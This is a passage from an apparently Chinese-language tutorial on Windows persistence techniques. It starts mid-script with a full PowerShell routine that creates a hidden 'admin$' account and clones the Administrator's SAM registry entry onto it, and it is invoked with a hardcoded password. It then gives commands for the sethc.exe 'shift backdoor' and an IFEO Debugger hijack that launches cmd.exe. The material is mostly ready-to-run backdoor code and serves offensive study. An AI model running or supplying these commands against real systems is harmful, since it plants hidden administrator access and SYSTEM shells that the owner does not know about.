style="color:#e3116c">&quot;administrator&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">function</span><span class="token plain"> Create-user </span><span class="token punctuation" style="color:#393A34">(</span><span class="token namespace" style="opacity:0.7">[string]</span><span class="token variable" style="color:#36acaa">$Username</span><span class="token punctuation" style="color:#393A34">,</span><span class="token namespace" style="opacity:0.7">[string]</span><span class="token variable" style="color:#36acaa">$Password</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$group</span><span class="token plain"> = </span><span class="token string" style="color:#e3116c">&quot;Administrators&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$adsi</span><span class="token plain"> = </span><span class="token namespace" style="opacity:0.7">[ADSI]</span><span class="token string" style="color:#e3116c">&quot;WinNT://</span><span class="token string variable" style="color:#36acaa">$env</span><span class="token string" style="color:#e3116c">:COMPUTERNAME&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$existing</span><span class="token plain"> = </span><span class="token variable" style="color:#36acaa">$adsi</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Children </span><span class="token punctuation" style="color:#393A34">|</span><span class="token plain"> where </span><span class="token punctuation" style="color:#393A34">{</span><span class="token variable" style="color:#36acaa">$_</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">SchemaClassName </span><span class="token operator" style="color:#393A34">-eq</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;user&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-and</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$_</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Name </span><span class="token operator" style="color:#393A34">-eq</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$Username</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token variable" style="color:#36acaa">$existing</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-eq</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$null</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">Write-Host</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;Creating new local user </span><span class="token string variable" style="color:#36acaa">$Username</span><span class="token string" style="color:#e3116c"> with password </span><span class="token string variable" style="color:#36acaa">$Password</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            &amp; NET USER </span><span class="token variable" style="color:#36acaa">$Username</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$Password</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">add </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">y </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">expires:never </span><span class="token punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Out-Null</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">Write-Host</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;Adding local user </span><span class="token string variable" style="color:#36acaa">$Username</span><span class="token string" style="color:#e3116c"> to </span><span class="token string variable" style="color:#36acaa">$group</span><span class="token string" style="color:#e3116c">.&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            &amp; NET LOCALGROUP </span><span class="token variable" style="color:#36acaa">$group</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$Username</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">add </span><span class="token punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Out-Null</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">Write-Host</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;[*] Setting password for existing local user </span><span class="token string variable" style="color:#36acaa">$Username</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token variable" style="color:#36acaa">$existing</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">SetPassword</span><span class="token punctuation" style="color:#393A34">(</span><span class="token variable" style="color:#36acaa">$Password</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">           </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">Write-Host</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;[*] Ensuring password for </span><span class="token string variable" style="color:#36acaa">$Username</span><span class="token string" style="color:#e3116c"> never expires&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        WMIC USERACCOUNT WHERE </span><span class="token string" style="color:#e3116c">&quot;Name=&#x27;</span><span class="token string variable" style="color:#36acaa">$Username</span><span class="token string" style="color:#e3116c">&#x27;&quot;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">SET</span><span class="token plain"> PasswordExpires=FALSE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">function</span><span class="token plain"> GetUser-Key</span><span class="token punctuation" style="color:#393A34">(</span><span class="token namespace" style="opacity:0.7">[string]</span><span class="token variable" style="color:#36acaa">$user</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        cmd </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">c </span><span class="token string" style="color:#e3116c">&quot;regedit /e </span><span class="token string variable" style="color:#36acaa">$env</span><span class="token string" style="color:#e3116c">:temp\</span><span class="token string variable" style="color:#36acaa">$user</span><span class="token string" style="color:#e3116c">.reg &quot;</span><span class="token plain">HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\</span><span class="token variable" style="color:#36acaa">$user</span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$file</span><span class="token plain"> = </span><span class="token function" style="color:#d73a49">Get-Content</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string variable" style="color:#36acaa">$env</span><span class="token string" style="color:#e3116c">:temp\</span><span class="token string variable" style="color:#36acaa">$user</span><span class="token string" style="color:#e3116c">.reg&quot;</span><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Out-String</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$pattern</span><span class="token plain">=</span><span class="token string" style="color:#e3116c">&quot;@=hex\((.*?)\)\:&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$file</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-match</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$pattern</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">|</span><span class="token function" style="color:#d73a49">Out-Null</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$key</span><span class="token plain"> = </span><span class="token string" style="color:#e3116c">&quot;00000&quot;</span><span class="token operator" style="color:#393A34">+</span><span class="token variable" style="color:#36acaa">$matches</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">Write-Host</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$key</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$key</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">function</span><span class="token plain"> Clone </span><span class="token punctuation" style="color:#393A34">(</span><span class="token namespace" style="opacity:0.7">[string]</span><span class="token variable" style="color:#36acaa">$ukey</span><span class="token punctuation" style="color:#393A34">,</span><span class="token namespace" style="opacity:0.7">[string]</span><span class="token variable" style="color:#36acaa">$cukey</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$ureg</span><span class="token plain"> = </span><span class="token string" style="color:#e3116c">&quot;HKLM:\SAM\SAM\Domains\Account\Users\</span><span class="token string variable" style="color:#36acaa">$ukey</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">|</span><span class="token function" style="color:#d73a49">Out-String</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$cureg</span><span class="token plain"> = </span><span class="token string" style="color:#e3116c">&quot;HKLM:\SAM\SAM\Domains\Account\Users\</span><span class="token string variable" style="color:#36acaa">$cukey</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">|</span><span class="token function" style="color:#d73a49">Out-String</span><span class="token plain">       </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$cuFreg</span><span class="token plain"> = </span><span class="token function" style="color:#d73a49">Get-Item</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Path </span><span class="token variable" style="color:#36acaa">$cureg</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Trim</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$cuFvalue</span><span class="token plain"> = </span><span class="token variable" style="color:#36acaa">$cuFreg</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">GetValue</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;F&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">Set-ItemProperty</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">path </span><span class="token variable" style="color:#36acaa">$ureg</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Trim</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Name </span><span class="token string" style="color:#e3116c">&quot;F&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">value </span><span class="token variable" style="color:#36acaa">$cuFvalue</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$outreg</span><span class="token plain"> = </span><span class="token string" style="color:#e3116c">&quot;HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</span><span class="token string variable" style="color:#36acaa">$ukey</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        cmd </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">c </span><span class="token string" style="color:#e3116c">&quot;regedit /e </span><span class="token string variable" style="color:#36acaa">$env</span><span class="token string" style="color:#e3116c">:temp\out.reg </span><span class="token string variable" style="color:#36acaa">$outreg</span><span class="token string" style="color:#e3116c">.Trim()&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">Write-Host</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;Copy from </span><span class="token string variable" style="color:#36acaa">$cu</span><span class="token string" style="color:#e3116c"> to </span><span class="token string variable" style="color:#36acaa">$u</span><span class="token string" style="color:#e3116c"> success.&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">function</span><span class="token plain"> Main </span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">Write-Host</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;[*] Current token: &quot;</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">NoNewline</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$token</span><span class="token plain">=whoami</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token variable" style="color:#36acaa">$token</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-ne</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;nt authority\system&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">Write-Host</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;  &quot;</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$token</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">Write-Host</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;[!] Low privileges.&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">Write-Host</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;[*] Exit.&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">Exit</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">Write-Host</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$token</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">Write-Host</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;[*] Create User...&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Create-user </span><span class="token variable" style="color:#36acaa">$u</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$p</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">Write-Host</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;[*] Get User </span><span class="token string variable" style="color:#36acaa">$u</span><span class="token string" style="color:#e3116c">&#x27;s Key: &quot;</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">NoNewline</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$ukey</span><span class="token plain"> = GetUser-Key </span><span class="token variable" style="color:#36acaa">$u</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">|</span><span class="token function" style="color:#d73a49">Out-String</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">Write-Host</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;[*] Get User </span><span class="token string variable" style="color:#36acaa">$cu</span><span class="token string" style="color:#e3116c">&#x27;s Key: &quot;</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">NoNewline</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$cukey</span><span class="token plain"> = GetUser-Key </span><span class="token variable" style="color:#36acaa">$cu</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">|</span><span class="token function" style="color:#d73a49">Out-String</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">Write-Host</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;[*] Try to clone...&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Clone </span><span class="token variable" style="color:#36acaa">$ukey</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$cukey</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">Write-Host</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;[*] Delete User:</span><span class="token string variable" style="color:#36acaa">$u</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Net User </span><span class="token variable" style="color:#36acaa">$u</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token function" style="color:#d73a49">del</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">|</span><span class="token function" style="color:#d73a49">Out-Null</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">Write-Host</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;[*] Import the registry&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        cmd </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">c </span><span class="token string" style="color:#e3116c">&quot;regedit /s </span><span class="token string variable" style="color:#36acaa">$env</span><span class="token string" style="color:#e3116c">:temp\</span><span class="token string variable" style="color:#36acaa">$u</span><span class="token string" style="color:#e3116c">.reg&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        cmd </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">c </span><span class="token string" style="color:#e3116c">&quot;regedit /s </span><span class="token string variable" style="color:#36acaa">$env</span><span class="token string" style="color:#e3116c">:temp\out.reg&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">Write-Host</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;[*] Clearn&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">Remove-Item</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$env</span><span class="token plain">:temp\</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">reg</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">Write-Output</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;[*] All Done.&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain">    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Main   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Create-Clone </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">u admin$ </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">p Aa123456</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="辅助功能镜像劫持">辅助功能镜像劫持<a href="#辅助功能镜像劫持" class="hash-link" aria-label="辅助功能镜像劫持的直接链接" title="辅助功能镜像劫持的直接链接">​</a></h2>
<p>为了使电脑更易于使用和访问，Windows 添加了一些辅助功能。这些功能可以在用户登录之前以组合键启动。根据这个特征，一些恶意软件无需登录到系统，通过远程桌面协议就可以执行恶意代码。</p>
<p>比如<strong>最常见的按5下shift出现的粘滞键Sethc.exe（shift后门）</strong>，还有Windows + U组合键时启动的utilman.exe程序</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">屏幕键盘：C:\Windows\System32\osk.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">放大镜：C:\Windows\System32\Magnify.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">旁白：C:\Windows\System32\Narrator.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">显示切换器 C:\Windows\System32\DisplaySwitch.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">应用切换器：C:\Windows\System32\AtBroker.exe</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="低版本">低版本<a href="#低版本" class="hash-link" aria-label="低版本的直接链接" title="低版本的直接链接">​</a></h3>
<p>在较早的 Windows 版本，只需要进行简单的二进制文件替换，比如经典的shift后门是将<code>C:\Windows\System32\sethc.exe</code>替换为<code>cmd.exe</code>。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd WINDOWS\system32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">move</span><span class="token plain"> sethc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe sethc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">bak</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">copy</span><span class="token plain"> cmd</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe sethc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe</span><br></span></code></pre></div></div>
<p>直接按5次shift键弹出cmd窗口，可直接以system权限执行系统命令，创建管理员用户，登录服务器等。</p>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/894761-20170929234953919-492550722-8c519111d7e2d2f4f7a208bc2c7297b5.png" width="783" height="572" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="高版本">高版本<a href="#高版本" class="hash-link" aria-label="高版本的直接链接" title="高版本的直接链接">​</a></h3>
<p>再较高的版本中，我们需要用到IFEO,即映像劫持。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="什么是ifeo">什么是IFEO<a href="#什么是ifeo" class="hash-link" aria-label="什么是IFEO的直接链接" title="什么是IFEO的直接链接">​</a></h4>
<p>所谓的IFEO就是<code>Image File Execution Options</code>，直译过来就是映像劫持。它又被称为“重定向劫持”（Redirection Hijack），它和“映像劫持”（Image Hijack，或IFEO Hijack）只是称呼不同，实际上都是一样的技术手段。白话来讲就是做某个操作的时候被拦截下来，干了别的事。</p>
<p><strong>当我们双击运行程序时，系统会查询该IFEO注册表，如果发现存在和该程序名称完全相同的子键，就查询对应子健中包含的“debugger”键值名，如果该参数不为空，系统则会把 Debugger 参数里指定的程序文件名作为用户试图启动的程序执行请求来处理。这样成功执行的是遭到“劫持”的虚假程序</strong></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="可视化修改">可视化修改<a href="#可视化修改" class="hash-link" aria-label="可视化修改的直接链接" title="可视化修改的直接链接">​</a></h4>
<p>在iexplorer.exe中加入键值对:<code>debugger c:\windows\system32\cmd.exe</code></p>
<p><img decoding="async" loading="lazy" alt="图片" src="/assets/images/640-ec4821051ad5a78e83e0a52c8415307f.bin" width="958" height="946" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="命令行修改">命令行修改<a href="#命令行修改" class="hash-link" aria-label="命令行修改的直接链接" title="命令行修改的直接链接">​</a></h4>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">reg add </span><span class="token string" style="color:#e3116c">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">v </span><span class="token string" style="color:#e3116c">&quot;Debugger&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">t REG_SZ </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">d </span><span class="token string" style="color:#e3116c">&quot;c:\windows\system32\cmd.exe&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">f</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="图片" src="/assets/images/640-20210706152521828-de415a424a115e2605a27d0adef266bb.png" width="1080" height="443" class="img_ev3q"></p>
<p>需要管理员权限</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="开机启动项">开机启动项<a href="#开机启动项" class="hash-link" aria-label="开机启动项的直接链接" title="开机启动项的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="开始菜单启动项">开始菜单启动项<a href="#开始菜单启动项" class="hash-link" aria-label="开始菜单启动项的直接链接" title="开始菜单启动项的直接链接">​</a></h3>
